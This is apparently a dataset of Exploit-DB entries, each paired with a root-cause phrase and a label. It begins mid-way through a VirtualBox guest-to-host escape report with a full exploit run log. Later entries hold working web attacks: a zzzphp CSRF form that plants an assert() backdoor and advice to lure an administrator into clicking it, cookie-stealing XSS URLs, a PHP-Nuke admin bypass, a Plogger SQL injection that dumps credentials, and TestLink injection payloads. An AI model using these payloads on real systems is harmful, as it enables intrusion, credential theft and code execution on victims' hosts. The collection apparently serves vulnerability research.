cause all following code to operate on out-of-bounds data.  In particular, an attacker can use this bug to obtain the following attack primitives:   - The attacker can leak out-of-bounds heap data by sending a UDP    packet to a host on the internet with checksum 0 and a bogus length    field in the IP header.    The host process will send a (possibly fragmented) UDP packet to    the specified host on the internet that includes out-of-bounds heap    data.    This method requires a cooperating host on the internet that the VM    can talk to using the NAT network interface.  - The attacker can leak out-of-bounds heap data by sending an ICMP    Echo Request with a bogus length field in the IP header    to the CTL_DNS address. The VM host then responds with an ICMP Echo    Reply that includes out-of-bounds heap data.    This approach has the advantage of not requiring a cooperating,    reachable server on the internet, but has the disadvantage that    the attacker needs to guess the 16-bit ICMP checksum.  - The attacker can corrupt the heap by sending a UDP packet with a    bogus length whose IP header contains IP options. The host process    will then attempt to strip the IP headers via ip_input -> udp_input    -> ip_stripoptions -> memcpy, which moves the IP payload - including    out-of-bounds heap data - to a lower address. This can    in particular be abused to overwrite a slirp heap chunk header    (struct item) with attacker-controlled packet data.  I have attached a crash PoC. Copy it into a VM whose only network interface is a NAT interface, compile it with ""gcc -o crasher crasher.c"" and run it with ""sudo ./crasher"". The VM should die after a few seconds, with something like this appearing in dmesg on the host:  [107463.674598] traps: EMT-0[66638] general protection ip:7fc6a26076e8 sp:7fc6d2e27ad0 error:0 in VBoxDD.so[7fc6a24e2000+36d000]  I have tested my crasher in VirtualBox version ""5.1.14 r112924"".  The bug was introduced in SVN revision <https://www.virtualbox.org/changeset/23155/vbox>.  ################################################################################  Without modifications, the exploit should work under the following conditions:   - host runs Ubuntu 14.04 (trusty), 64-bit  - host uses libc6 package version 2.19-0ubuntu6.9 (most recent    version)  - VirtualBox version is 5.1.14~112924~Ubuntu~trusty (official build)    (most recent version)  - guest runs Linux  - main network interface of the VM is a NAT interface (default    config)  The exploit is able to run an arbitrary shell command on the host system. The command is hardcoded to ""id > /tmp/owned_from_guest"".   Some things about the exploit that might be of interest to you:  The exploit operates on memory that belongs to the zone zone_clust of the UMA heap. The UMA heap is relatively easy to attack, partly because the sanity checks are compiled out in userland code in release builds. For example, the check `Assert((zone->magic == ZONE_MAGIC && zone == it->zone))` in uma_zfree_arg() becomes a no-op, and the LIST_CHECKs in LIST_REMOVE() have no effect. In particular, because the `zone == it->zone` assertion is not compiled into release builds, an attacker who can overwrite an item header and point its member ->zone to a controlled memory area can cause an arbitrary function it->zone->pfFini to be called when the item whose header was overwritten is freed. It might make sense to turn assertions in the allocator into something that is also active in release builds.  For exploiting the bug, it was very helpful that the VirtualBox binary is built as non-relocatable, meaning that the binary is always loaded at the same virtual address. The exploit uses a hardcoded address to leak the contents of the GOT (global offset table), which can then be used to locate the addresses of libc functions. It's probably a good idea to build the VirtualBox binaries as relocatable code to prevent attacks from simply using hardcoded addresses - and this mitigation is pretty simple to implement, you just have to add some compiler flags (`-pie -fPIE` or so). To verify that it's working, run VirtualBox, then as root, grep the contents of /proc/{pid of VirtualBox}/maps for VirtualBox and verify that the mappings don't have low ranges like 00400000-00408000, but use high addresses like 7ffb0f62e000 instead.  As far as I can tell from the source, on a Linux or Mac host, an attacker who has compromised the VM host process can also run arbitrary code in the host kernel using the ioctls SUP_IOCTL_LDR_OPEN and SUP_IOCTL_LDR_LOAD. If that is indeed the case, it might make sense to reduce the privileges of the userland host code by sandboxing components like the shared folder host and the NAT implementation and/or by rearchitecting VirtualBox so that the host kernel doesn't trust the host userland binary.   To reproduce the bug with the attached exploit:   - On the host or some other box on the internet, compile and run the    helper:         $ gcc -o helper helper.c -Wall        $ ./helper    - In the guest, compile the exploit:         # gcc -o bcs bcs.c -Wall -std=gnu99     (This may throw some harmless format string warnings depending on    whether the guest is 64-bit.)   - To improve reliability, ensure that the guest isn't    running any network services or clients, save the guest VM and    restore it. (Saving and restoring the guest resets the Slirp heap.)   - In the guest, as root, run the exploit. Pass the helper host's IP    address as argument.         # ./bcs xxx.xxx.xxx.xxx   - If the exploit was successful, there should be a new file    ""/tmp/owned_from_guest"" on the host that contains the output of the    ""id"" command.  A successful run of the exploit should look like this:  ================================================================== # ./bcs {censored} systemf: <<<ip route get 8.8.8.8 | grep ' dev ' | sed 's|.* dev \([^ ]*\) .*|\1|' | tr -d '\n'>>> enp0s3 ================================ systemf: <<<ip route get 8.8.8.8 | grep ' dev ' | sed 's|.* src \([^ ]*\) .*|\1|' | tr -d '\n'>>> 10.0.2.15 ================================ systemf: <<<ip route get 8.8.8.8 | grep ' dev ' | sed 's|.* via \([^ ]*\) .*|\1|' | tr -d '\n'>>> 10.0.2.2 ================================ systemf: <<<ping -c3 -w4 10.0.2.2>>> PING 10.0.2.2 (10.0.2.2) 56(84) bytes of data. 64 bytes from 10.0.2.2: icmp_seq=2 ttl=64 time=0.375 ms 64 bytes from 10.0.2.2: icmp_seq=3 ttl=64 time=0.277 ms 64 bytes from 10.0.2.2: icmp_seq=4 ttl=64 time=0.297 ms  --- 10.0.2.2 ping statistics --- 4 packets transmitted, 3 received, 25% packet loss, time 3054ms rtt min/avg/max/mdev = 0.277/0.316/0.375/0.044 ms  ================================ systemf: <<<arp -s 10.0.2.2 01:23:45:67:89:ab>>> systemf: <<<iptables -I OUTPUT -o enp0s3 -j DROP>>> defragging... defragged trying to leak...  got UDP, len=68 leak_udp successful got data 00000000  01 00 ad de 00 00 00 00  00 e6 b4 48 56 7f 00 00  |...........HV...| 00000010  01 00 00 00 00 00 00 00  58 3e 26 35 56 7f 00 00  |........X>&5V...| 00000020  18 2e 26 35 56 7f 00 00                           |..&5V...| 00000028 magic: 0xdead0001 zone: 0x7f5648b4e600 refcount: 0x1 next: 0x7f5635263e58 prev: 0x7f5635262e00 defragging... defragged placed shell command at 0x7f5635263676 freelist head at 0x7f5648b4e690 trying to leak...  got UDP, len=68 leak_udp successful got data 00000000  01 00 ad de 00 00 00 00  00 e6 b4 48 56 7f 00 00  |...........HV...| 00000010  01 00 00 00 00 00 00 00  a0 ec 25 35 56 7f 00 00  |..........%5V...| 00000020  60 dc 25 35 56 7f 00 00                           |`.%5V...| 00000028 magic: 0xdead0001 zone: 0x7f5648b4e600 refcount: 0x1 next: 0x7f563525eca0 prev: 0x7f563525dc48 defragging... defragged fake zone packet item at 0x7f563525e474, dummy_next at 0x7f563525fd42, fake_zone at 0x7f563525fd4a fake zone packet item at 0x7f563525e474, dummy_next at 0x7f563525f516, fake_zone at 0x7f563525f51e fake zone packet item at 0x7f563525e474, dummy_next at 0x7f563525ecea, fake_zone at 0x7f563525ecf2 fake zone packet item at 0x7f563525e474, dummy_next at 0x7f563525e4be, fake_zone at 0x7f563525e4c6 send_udp_datashift(shift_amount=40, data_length=9368) send_udp_datashift(shift_amount=36, data_length=9368) sending packet2, ip_off=0x28, ip_id=0x1a trying to leak GOT from fake chunk...  got UDP, len=540 leak_udp successful 00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................| * 00000200 defragging... defragged  got UDP, len=540 leak_udp successful 00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................| 00000010  b0 09 c0 97 56 7f 00 00  b6 0f 40 00 00 00 00 00  |....V.....@.....| 00000020  10 9d c3 97 56 7f 00 00  a0 a0 c3 97 56 7f 00 00  |....V.......V...| 00000030  e6 0f 40 00 00 00 00 00  90 28 c7 97 56 7f 00 00  |..@......(..V...| 00000040  20 9d c3 97 56 7f 00 00  e0 03 15 98 56 7f 00 00  | ...V.......V...| 00000050  26 10 40 00 00 00 00 00  36 10 40 00 00 00 00 00  |&.@.....6.@.....| 00000060  50 9e b9 97 56 7f 00 00  56 10 40 00 00 00 00 00  |P...V...V.@.....| 00000070  80 30 c6 97 56 7f 00 00  10 fc c0 97 56 7f 00 00  |.0..V.......V...| 00000080  86 10 40 00 00 00 00 00  96 10 40 00 00 00 00 00  |..@.......@.....| 00000090  c0 fe c0 97 56 7f 00 00  80 2c c7 97 56 7f 00 00  |....V....,..V...| 000000a0  d0 9f c3 97 56 7f 00 00  30 9d c3 97 56 7f 00 00  |....V...0...V...| 000000b0  60 28 c7 97 56 7f 00 00  90 e0 f3 97 56 7f 00 00  |`(..V.......V...| 000000c0  70 c8 c6 97 56 7f 00 00  16 11 40 00 00 00 00 00  |p...V.....@.....| 000000d0  30 0c c8 97 56 7f 00 00  a0 c8 c6 97 56 7f 00 00  |0...V.......V...| 000000e0  60 c9 c6 97 56 7f 00 00  d0 0b 15 98 56 7f 00 00  |`...V.......V...| 000000f0  66 11 40 00 00 00 00 00  76 11 40 00 00 00 00 00  |f.@.....v.@.....| 00000100  86 11 40 00 00 00 00 00  96 11 40 00 00 00 00 00  |..@.......@.....| 00000110  50 e1 f3 97 56 7f 00 00  b6 11 40 00 00 00 00 00  |P...V.....@.....| 00000120  c6 11 40 00 00 00 00 00  00 00 00 00 00 00 00 00  |..@.............| 00000130  00 00 00 00 00 00 00 00  ff ff ff ff 00 00 00 00  |................| 00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................| * 00000160  00 00 00 00 00 00 00 00  0c 00 00 00 00 00 00 00  |................| 00000170  00 00 00 00 22 05 08 20  00 20 00 00 88 13 00 00  |...."".. . ......| 00000180  81 cb 05 00 02 00 00 00  b9 4b 40 00 00 00 00 00  |.........K@.....| 00000190  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................| 000001a0  00 00 00 00 00 00 00 00  2f 75 73 72 2f 6c 69 62  |......../usr/lib| 000001b0  2f 76 69 72 74 75 61 6c  62 6f 78 00 56 69 72 74  |/virtualbox.Virt| 000001c0  75 61 6c 42 6f 78 00 00  00 00 00 00 00 00 00 00  |ualBox..........| 000001d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................| * 00000200 strlen at 0x7f5697c009b0 system() at 0x7f5697bbe590 calling system()... defragging... defragged trying to leak...  got UDP, len=68 leak_udp successful got data 00000000  01 00 ad de 00 00 00 00  00 e6 b4 48 56 7f 00 00  |...........HV...| 00000010  01 00 00 00 00 00 00 00  84 cd 0f 35 56 7f 00 00  |...........5V...| 00000020  44 bd 0f 35 56 7f 00 00                           |D..5V...| 00000028 magic: 0xdead0001 zone: 0x7f5648b4e600 refcount: 0x1 next: 0x7f56350fcd84 prev: 0x7f56350fbd2c defragging... defragged fake zone packet item at 0x7f56350fc558, dummy_next at 0x7f56350fc5a2, fake_zone at 0x7f56350fc5aa send_udp_datashift(shift_amount=40, data_length=3092) send_udp_datashift(shift_amount=36, data_length=3092) sending packet2, ip_off=0xa, ip_id=0x27 did that work? systemf: <<<iptables -D OUTPUT -o enp0s3 -j DROP>>> ==================================================================  If the exploit crashes, you'll have to remove the firewall rule the exploit added with `iptables -D OUTPUT -o {interface} -j DROP` inside the VM to restore network connectivity.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41904.zip",the sanity checks are compiled out in userland code in release builds,1
46488,"zzzphp CMS 1.6.1 - Cross-Site Request Forgery # Exploit Title: Cross-Site Request Forgery(CSRF) of zzzphp cms 1.6.1 # Google Dork: intext:""2015-2019 zzcms.com""  # Date: 26/02/2019  # Exploit Author: Yang Chenglong  # Vendor Homepage: http://www.zzzcms.com/index.html  # Software Link: http://115.29.55.18/zzzphp.zip  # Version: 1.6.1  # Tested on: windows/Linux,iis/apache  # CVE : CVE-2019-9082  Due to the absence of CSRF token in the request, attackers can forge the post request and insert malicious codes into the template file which leads to dynamic code evaluation.  Exploit:   <html>      <!-- CSRF PoC - generated by Burp Suite Professional -->      <body>      <script>history.pushState('', '', '/')</script>        <form action=""http://192.168.1.64/zzzphp/admin015/save.php?act=editfile"" method=""POST"">          <input type=""hidden"" name=""file"" value=""&#47;zzzphp&#47;template&#47;pc&#47;cn2016&#47;html&#47;search&#46;html"" />          <input type=""hidden"" name=""filetext"" value=""&#123;if&#58;assert&#40;&#36;&#95;POST&#91;x&#93;&#41;&#125;phpinfo&#40;&#41;&#59;&#123;end&#32;if&#125;"" />          <input type=""submit"" value=""Submit request"" />        </form>        <script>          document.forms[0].submit();        </script>      </body>    </html>  Save the codes above as html file and host it on a web server. Send the link to the administrator of the website and ask him to click the link(request for exchange friend link or any other possible method), if the person has logged on to the admin panel, it will automatically insert malicious codes in to the template file and leads to dynamic code evaluation.  Remarks: This is a follow up exploit of CVE-2019-9041, whose exploit is here: https://www.exploit-db.com/exploits/46454",the absence of CSRF token in the request,1
35765,"Cisco Unified Operations Manager 8.5 - '/iptm/faultmon/ui/dojo/Main/eventmon_wrapper.jsp' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/47901/info     Cisco Unified Operations Manager is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.     An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials. Other attacks may also be possible.     This issue is being tracked by Cisco Bug ID CSCtn61716.     Cisco Unified Operations Manager versions prior to 8.6 are vulnerable.  http://www.example.com/iptm/faultmon/ui/dojo/Main/eventmon_wrapper.jsp?clusterName=d4f84""%3b alert(1)//608ddbf972 http://www.example.com/iptm/faultmon/ui/dojo/Main/eventmon_wrapper.jsp?deviceName=c25e8""%3ba lert(1)//79877affe89",fails to properly sanitize user-supplied input,1
20158,"PHP-Nuke 1.0/2.5 - Administrative Privileges source: https://www.securityfocus.com/bid/1592/info  PHP-Nuke is a website creation/maintainence tool written in PHP3. It is possible to elevate priviliges in this system from normal user to administrator due to a flaw in authentication code. The problem occurs here:  $aid = variable holding author name, pwd = author password  $result=mysql_query(""select pwd from authors where aid='$aid'""); if(!$result) { echo ""Selection from database failed!""; exit; } else { list($pass)=mysql_fetch_row($result);  if($pass == $pwd) { $admintest = 1; } }  First off, the code checks to make sure the query passed to mysql_query is legal. There are no checks to see whether any rows are returned (whether any authors match $aid..). Then, the password given is compared to the result of the above query. If the author doesn't match, mysql_fetch_row returns FALSE. This is where the problem occurs. A NULL string is logically equal to FALSE and thus if an empty string is supplied as password, the condition tested for above (the if($pass == $pwd)) is met and admintest is set to 1 (TRUE). The user is then able to perform all administrative functions.  http://target/admin.php3?admin=any_data",a flaw in authentication code,1
29379,AShop Deluxe 4.5 - 'search.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/21845/info    AShop Deluxe and AShop Administration Panel are prone to multiple cross-site scripting vulnerabilities because they fail to sufficiently sanitize user-supplied input data.    An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.    http://www.example.com/ashop/search.php?searchstring=[XSS],fail to sufficiently sanitize user-supplied input data,1
24621,"Pinnacle ShowCenter 1.51 - Web Interface Skin Denial of Service source: https://www.securityfocus.com/bid/11232/info  The Pinnacle Systems ShowCenter web-based interface is reported prone to a remote denial of service vulnerability.   The issue exists due to a lack of sanity checks performed on the Skin parameter of a ShowCenter script.  It is reported that the affect of this attack will be persistent, any request for the ShowCenter web-based interface received subsequent to an attack will result in 'File or Folder not found' error message, as the interface fails to render.  A remote attacker may exploit this condition to persistently deny service to the ShowCenter web-based interface.  http://www.example.com:8000/ShowCenter/SettingsBase.php?Skin=ATK",a lack of sanity checks performed on the Skin parameter of a ShowCenter script,1
36870,"ContentLion Alpha 1.3 - 'login.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/52112/info  ContentLion Alpha is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  ContentLion Alpha 1.3 is vulnerable; other versions may also be affected.   http://www.example.com/contentlion-alpha-1-3/login.html?'""</script><script>alert('JaVaScr1pT')</script>",fails to properly sanitize user-supplied input,1
6204,"Plogger 3.0 - SQL Injection ########################################################## # GulfTech Security Research              August 05, 2008 ########################################################## # Vendor : Mike Johnson # URL : http://www.plogger.org/ # Version : Plogger <= 3.0 # Risk : SQL Injection ##########################################################   Description: Plogger is a popular online gallery tool written in php that allows users to create an online gallery. It is vulnerable to SQL Injection issues, which also allow for arbitrary file disclosure since certain data from the returned SQL results is used as a filename argument when calling file_get_contents(). Together these issues can be used to completely take over the vulnerable Plogger application. All users should upgrade their Plogger installations as soon as possible.    SQL Injection: There are a number of SQL Injection issues within plogger. The issues can be found in plog-download.php, and plog-remote.php As mentioned earlier this issue also allows for the download of arbitrary files on the target web server.  elseif($type == ""album"" || $type == ""search""){ foreach ($checked as $pid){     $query = ""SELECT * FROM `"".TABLE_PREFIX.""pictures` WHERE `id`='"".$pid.""'"";     $result = run_query($query);                 while ($row = mysql_fetch_assoc($result)){     $file_contents = file_get_contents(""images/"".$row[""path""], true);     $zipfile -> add_file($file_contents, $row[""path""]);     }     } }  The above code comes from plog-download.php @ lines 285-297 and shows how both SQL Injection and arbitrary file access are possible via the same flaw. The ""checked"" variable is taken directly from $_REQUEST['checked'] and never get's sanitized. The issues in plog-remote.php are similar and basically come down to the various commands sending unsanitized gpc variables to the get_album_by_name() function. The only commands within plog-remote.php that are not vuln are ""fetch-albums"" and ""login""  /plog-download.php?dl_type=album&checked[]=' UNION SELECT concat (admin_username,char(58),admin_password),0,0,0,0,0,0,0,0,0,0,0,0 ,0,0 FROM plogger_config/*  The above url would successfully download the admin credentials in the form of a zip file. To read arbitrary files on the server vs reading admin credentials an attacker simply need to supply the relative location of a file on the webserver in place of the data in the first column of the union select above. It is also worth mentioning that once an attacker has admin access, executing arbitrary code is very much possible by updating the ""theme_dir"" settings in the database to include an arbitrary path to an uploaded image, that is terminated with a null byte.  // insert into database $new_theme_dir = basename($_REQUEST[""activate""]); $metafile = $config['basedir'] . '/themes/' . $new_theme_dir . '/meta.php'; if (file_exists($metafile)) {     include($metafile);     $sql = 'UPDATE '.TABLE_PREFIX.'config SET `theme_dir` = \''.$new_theme_dir.'\'';     $name = $theme_name . ' ' . $version;     if (mysql_query($sql)) {         $output .= '<p class=""actions"">' . sprintf(plog_tr(""Activated New Theme         <strong>%s</strong>""),$name). '</p>';     } else {         $output .= '<p class=""errors"">' . plog_tr(""Error Activating Theme!"") . '</p>';     };      // update config variable if page doesn't refresh     $config[""theme_dir""] = $new_theme_dir; } else {         $output .= '<p class=""errors"">' . plog_tr(""No such theme"") . '</p>'; };  The above code comes from /admin/plog-themes.php @ lines 40-57 and shows a possible avenue for attackers to use in order to update the 'theme_dir' in the database. The only trick to this is we have make the ""activate"" parameter pass both the file_exists() check, the basename() check, and still have it update the ""theme""dir"" data in the database with our arbitrary file path.  /admin/plog-themes.php?activate=%00', `theme_dir` = concat (feed_title,char(0)) -- *  The above url will successfully copy the data that is contained within the ""feed_title"" column in the database to the ""theme_dir"" column, while at the same time passing both sanity checks. The ""feed_title"" column can be updated from the main administrative options and gladly accepts our arbitrary traversed file path leading to the image file containing malicious php code. Since the first byte of our ""activate"" parameter contains a null byte the file_exists() check only sees ""/themes/"" as the path, instead of the data contained in the ""activate"" parameter, and thus passes the file_exists() check. I terminate the above query with "" -- "" vs ""/*"" since the basename() function will cause problems if we terminate the query this way due to the backslash that would be used in the query termination.    Solution: Fixes for the issues mentioned in this advisory are already available via the Plogger public SVN, and a new version of Plogger which also addresses these issues will be available later in the week.    Credits: James Bercegay of the GulfTech Security Research Team  # milw0rm.com [2008-08-05]",the backslash that would be used in the query termination,1
37202,WordPress Plugin Share and Follow 1.80.3 - 'admin.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/53533/info  The Share and Follow plugin for WordPress is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Share and Follow 1.80.3 is vulnerable; other versions may also be affected.   http://www.example.com/wp-admin/admin.php?page=share-and-follow-menu CDN API Key content: &quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,fails to properly sanitize user-supplied input,1
27446,"MusicBox 2.3 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17149/info   MusicBox is prone to multiple input-validation vulnerabilities. The issues include cross-site scripting and SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.    Successful exploitation of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.  http://www.example.com/music/index.php?id='><script>alert(document.cookie)</script>   http://www.example.com/music/index.php?action=top&show=5&type='><script>alert(d ocument.cookie)</script>   http://www.example.com/music/index.php?action=top&show='><script>alert(document .cookie)</script>&type=Artists",a failure in the application to properly sanitize user-supplied input,1
10364,"TestLink Test Management and Execution System - Multiple Cross-Site Scripting / Injection Vulnerabilities                                 Core Security Technologies - CoreLabs Advisory                                          http://www.coresecurity.com/corelabs/  Multiple XSS and Injection Vulnerabilities in TestLink Test Management and Execution System   1. *Advisory Information*  Title: Multiple XSS and Injection Vulnerabilities in TestLink Test Management and Execution System Advisory Id: CORE-2009-1013 Advisory URL: http://www.coresecurity.com/content/testlink-multiple-injection-vulnerabilities Date published: 2009-12-09 Date of last update: 2009-12-09 Vendors contacted: TestLink Community Release mode: Coordinated release   2. *Vulnerability Information*  Class: Cross site scripting [CWE-79], SQL injection [CWE-89] Impact: Code execution Remotely Exploitable: Yes Locally Exploitable: No Bugtraq ID: 37258 CVE Name: CVE-2009-4237, CVE-2009-4238   3. *Vulnerability Description*   Multiple injection (both XSS [1] and SQL) vulnerabilities have been discovered in Testlink [2], a widely used test-case management application written in PHP [3]. One of the XSS vulnerabilities, discovered in its login screen, can be exploited without an authenticated session.   4. *Vulnerable packages*     . TestLink 1.8.0    . TestLink 1.8.1    . TestLink 1.8.2    . TestLink 1.8.3    . TestLink 1.8.4    . Older versions are probably affected too, but they were not checked.   5. *Non-vulnerable packages*     . TestLink 1.8.5   6. *Solutions and Workarounds*   Upgrade to a non-vulnerable version, such as 1.8.5. TestLink features the option to upgrade a current installation in its install scripts.   7. *Credits*   These vulnerabilities were discovered and researched by Pablo Annetta, from Core Security Technologies, during Core Bugweek 2009 as a member of the ""Los Herederos de Don Pablo (HDP)"" team.   8. *Technical Description / Proof of Concept Code*   Most of these vulnerabilities are present in the Testlink code because the logic for the sanitization of user input is rudimentary. Each script sanitizes its own input, instead of abstracting this task to another layer of logic. Often only slashes are stripped, but html entities are almost never escaped.   The only vulnerability in this report that can be exploited without an authenticated session is a XSS vulnerability in Testlink's login page 'login.php'. This script gets a parameter named 'req', which is used by the application to set the next request to be made. All parameters are initialized in the 'init_args' function which doesn't sanitize its arguments appropriately as seen below.  /----- function init_args() {     $args = new stdClass();     $_REQUEST = strings_stripSlashes($_REQUEST);          $args->note = isset($_REQUEST['note']) ? $_REQUEST['note'] : null;     $args->login = isset($_REQUEST['tl_login']) ? trim($_REQUEST['tl_login']) : null;     $args->pwd = isset($_REQUEST['tl_password']) ? $_REQUEST['tl_password'] : null;      $args->reqURI = isset($_REQUEST['req']) ? $_REQUEST['req'] : null;     $args->preqURI = (isset($_REQUEST['reqURI']) && strlen($_REQUEST['reqURI'])) ? $_REQUEST['reqURI'] : null;       return $args; } - -----/   This vulnerability can be verified by issuing the following request to a Testlink installation on localhost:  /----- http://127.0.0.1/testlink/login.php?req="";><iframe src =""http://www.coresecurity.com/content/xxxx""; width=""100%"" height=""300""></iframe> - -----/    Other XSS vulnerabilities on different scripts can be exploited with an authenticated session. Proof of concept code follows:  /----- http://127.0.0.1/testlink/lib/general/staticPage.php?key="";><script>alert(document.cookie)</script>  http://127.0.0.1/testlink/lib/attachments/attachmentupload.php?id=1&tableName='<script>alert(document.cookie)</script> http://127.0.0.1/testlink/lib/events/eventviewer.php?startDate="";<script>alert(document.cookie)</script> http://127.0.0.1/testlink/lib/events/eventviewer.php?endDate="";<script>alert(document.cookie)</script> http://127.0.0.1/testlink/lib/events/eventviewer.php?logLevel="";<script>alert(document.cookie)</script> - -----/    There are more XSS attacks that can be executed with *an authenticated session* on installations that have *at least one test plan created*. Most of these are due to an 'echo' statement in TestLink's database functions that directly outputs SQL errors back to the browser without escaping html entities. This can be found on line 181 of 'testlink/lib/functions/database.class.php', where some function such as 'htmlspecialchars' should be called on ' $this->error($p_query)' and '$message'. A templating engine (TestLink uses Smarty for many other tasks) could also be used to output these errors.  /----- if ( !$t_result ) {     echo ""ERROR ON exec_query() - database.class.php <br>"" . $this->error($p_query) . ""<br>"";   echo ""<br> THE MESSAGE :: $message. ""<br>"";     return false; } else {     return $t_result; } - -----/   This proof of concept code triggers the vulnerabilities described above:  /----- http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&expected_results='<script>alert(document.cookie)</script> http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&name=<script>alert(document.cookie)</script> http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&steps=<script>alert(document.cookie)</script> http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='<script>alert(document.cookie)</script> - -----/   More XSS vulnerabilities can also be triggered because of the problem described above, but also because another independent XSS exists on 'resultsMoreBuilds_buildReport.php' caused by not escaping the 'search_notes_string', by issuing this request (also when logged into an installation with a Test Plan created):  /----- http://127.0.0.1/testlink/lib/results/resultsMoreBuilds_buildReport.php?report_type=0&display_query_params=1&search_notes_string=</td><script>alert(document.cookie)</script> - -----/    With an authenticated session, the following SQL injection bug can also be exploited.   In 'http://127.0.0.1/testlink/lib/general/navBar.php', filling in the 'Test Case ID' field with 'TC-1 or 1 = 1 update tcversions set summary = '</td><script>alert(document.cookie)</script><td>'' results in reflected HTML.   Also with an authenticated session the following blind SQL injection exists  /----- http://127.0.0.1/testlink/lib/events/eventviewer.php?logLevel=1,1)%20union%20SELECT%20id%20FROM%20testplans%20%23 - -----/   9. *Report Timeline*  . 2009-10-29: Core Security Technologies notifies Toshiyuki Kawanishi (at his @users.sourceforge.jp address) from the Teamst team of the vulnerabilities, offering a draft for this advisory in plaintext or encrypted form (if proper keys are sent). November 9th, 2009, is proposed as a release date.  . 2009-11-02: Because no response was obtained from Toshiyuki at his @users.sourceforge.jp, Core Security Technologies tries to contact him using the ""Contact"" webform in http://www.teamst.org.  . 2009-11-09: Since there is still no reply from Toshiyuki, Core now tries contacting Francisco Mancardi. November 23rd is now proposed as a release date.  . 2009-11-09: Francisco Mancardi replies asking that a copy in plaintext of the advisory be sent to him, and also to Toshiyuki Kawanishi and Martin Havlat.  . 2009-11-09: Core sends a draft for this advisory, including the technical description of the vulnerabilities, to Francisco Mancardi, Toshiyuki Kawanishi and Martin Havlat.  . 2009-11-10: Martin Havlat replies acknowledging reception of the advisory draft, and tells Core that internal issue #2947 has been created in their bug tracking system to fix these bugs. He mentions these issues shall be fixed on release 1.8.5 of TestLink.  . 2009-11-12: Core replies asking for more information regarding the release date of TestLink 1.8.5. An account is created by Core in TestLink's internal bug tracking system to access information about issue #2947.  . 2009-11-17: Core requests again information regarding the release date of TestLink 1.8.5 in order to schedule the release of this advisory accordingly, since no reply on this has been yet given by the TestLink developers contacted. Core also mentions that issue #2947 cannot be accessed by the user created in order to follow the development of a patch for the vulnerabilities reported here.  . 2009-11-17: Francisco Mancardi replies specifying that ""maybe [issue #2947] has private status"".  . 2009-11-20: Core asks once more for a release date for a fixed version of TestLink. The advisory is rescheduled for release on Monday 30th, November, since there is no information regarding the possibility of meeting the deadline of Monday 23rd by the TestLink team. Core also mentions that they are eager to passively monitor the progress of the TestLink developers in fixing these issues if access is given to issue #2947 to their created account on TestLink's bug tracking system.  . 2009-11-26: Since there was no reply to their last e-mail, Core resends it, reminding the developers that their planned release date for the advisory is Monday 30th, and that they would like to know if there is a planned release date for a fixed version of TestLink. Core reminds the developers about their commitment in helping them in correctly fixing the bug, should they get access to private issue #2947.  . 2009-11-27: Martin Havlat replies that due to priorities in the internal development group of Testlink the bug has not yet been fixed. He commits to release TestLink 1.8.5 as soon as this bug is fixed, but besides stating that he wished to have time to fix this himself, no firm or verifiable claim is made that can assure Core of a planned fix and release.  . 2009-11-27: Core reschedules its internal publication date for this advisory to December 14th. This will be the final date and a user-release will be made, unless TestLink developers share information that can be verified by Core that shows commitment to eventually looking into said bugs and fixing them. Core suggests that developers actually in charge of these issues are copied in the e-mail loop, or that access to internal issue-tracking tools be given to them to actively participate in the discussions and the patching process.  . 2009-11-30: Martin Havlat asks for technical details needed by him to confirm some of these vulnerabilities.  . 2009-12-01: Core replies with the technical details needed by Martin Havlat.  . 2009-12-02: Martin Havlat sends a patched version of TestLink to Core asking for verification of fixes to some of the vulnerabilities reported in this advisory.  . 2009-12-03: Core replies saying that the fixes proposed by Martin Havlat fail to patch those specific vulnerabilities. The bugs are further researched by Core and the advisory draft is modified to include a more detailed explanation of these bugs. This technical information is shared by Core with Martin Havlat and some insight into possible fixes is also given.  . 2009-12-09: TestLink 1.8.5 is released.  . 2009-12-09: Advisory CORE-2009-1013 is published.   10. *References*  [1] http://www.owasp.org/index.php/Cross-site_Scripting_(XSS) [2] http://www.teamst.org/ [3] http://www.owasp.org/index.php/PHP_Top_5   11. *About CoreLabs*  CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://www.coresecurity.com/corelabs.   12. *About Core Security Technologies*  Core Security Technologies develops strategic solutions that help security-conscious organizations worldwide develop and maintain a proactive process for securing their networks. The company's flagship product, CORE IMPACT, is the most comprehensive product for performing enterprise security assurance testing. CORE IMPACT evaluates network, endpoint and end-user 